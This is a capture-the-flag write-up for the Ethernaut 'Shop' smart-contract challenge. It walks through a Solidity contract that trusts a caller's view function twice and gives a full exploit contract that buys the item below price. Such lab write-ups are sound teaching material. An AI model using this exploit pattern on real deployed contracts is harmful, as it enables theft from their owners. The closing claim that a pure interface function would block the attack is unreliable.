# Writeup for Shop

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Can you get the item from the shop for less than the price asked?

Things that might help:

- Shop expects to be used from a Buyer
- Understanding restrictions of view functions

### Contract Explanation

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

<details>
<summary>Click to view the source contract and contract explanation</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

```

The contract has two state variables named `price` and `isSold`. `price` is of type **uint256** and it is initialized to 100, while `isSold` is of type **bool**.

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```

The function `buy()` initializes the variable `_buyer` of type `Buyer` interface with `msg.sender`. It then checks if the price offered by the buyer is greater than or equal to the current price and if the item has not been sold yet. If both conditions are met, the item is marked as sold and the price is updated to the buyer's price.

</details>

### Exploit

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```

If we see the `buy()` function, in the if condition, it will check if the buyer's price is more than the current price or not. But the buyer's price is taken by making a call to the buyer. Once the conditions are satisfied, then it sets `isSold` to true and it sets the price by again making a call to the buyer.

So in our exploit contract, if we somehow return the price value `>100` for the first time it is called and if we return a value less than `<100` for the second time it is called, then our challenge will be solved.

But if we check the Buyer interface, we can find that `price()` is a view-only function, which means we cannot make any state changes in the `price()` function.

Once the if condition in `buy()` is satisfied, then `isSold` is set to true and then the price value is fetched from the buyer. Since `price()` function is a view function, we can check if `isSold` is true or false before returning the price. Based on that, we can write the exploit contract. Below is the exploit contract.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ishop{
    function isSold() external view returns (bool);
    function buy()external;
}

contract ExploitShop{
    Ishop shop;
    constructor(address _addr){
        shop=Ishop(_addr);
    }

    function Exploit()public{
        shop.buy();
    }

    function price() external view returns(uint256){
        if(shop.isSold()){
            return 0;
        }
        return 101;
    }
}
```

If we see the `price()` function in our exploit contract, first it will check if the item is sold or not. If the item is sold, it will `return 0`, otherwise it will `return 101`.

Once we call the `Exploit()` function, our challenge will be solved.

### Key Takeaways

We should be careful when the logic in our contract is dependent on other contract calls. In this case, if the `price()` function is a `pure function` instead of a `view function`, then the function won't be able to read state variables from other contracts.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
